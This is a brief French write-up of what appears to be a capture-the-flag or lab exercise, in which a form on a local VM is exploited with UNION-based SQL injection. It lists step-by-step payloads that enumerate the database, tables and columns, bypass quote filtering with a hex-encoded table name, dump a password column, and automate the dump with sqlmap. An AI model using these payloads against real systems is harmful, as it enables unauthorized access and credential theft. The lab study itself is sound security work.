Le formulaire est vulnerable aux injections SQL de type UNION

A)
1 UNION SELECT database(),null
Pour decouvrir le nom de la DB

B)
1 UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema=database()
Pour decouvrir le nom de la table

C)
echo -n "users" | xxd -p
Permet d'ecrire 'user' sans avoir recours aux quotes qui ne sont pas acceptees

1 UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'
Ne fonctionne pas

1 UNION SELECT column_name,null FROM information_schema.columns WHERE table_name=0x7573657273
Affiche les colonnes de la table user

D)
Selectionner/lister une colonne a extraire a partir de la sortie de l'injection precedente

1 UNION SELECT first_name,countersign FROM users
Affiche le contenu d'une colonne (contersign)

Une fois toutes les colonnes dumpees on tombe sur le Flag.
On peut aussi le faire de maniere automatique avec la commande sqlmap suivante:
sqlmap -u "http://192.168.56.101/?page=member&id=1&Submit=Submit" \
       --dbms=mysql \
       --dump \
       --batch \
       -s 1
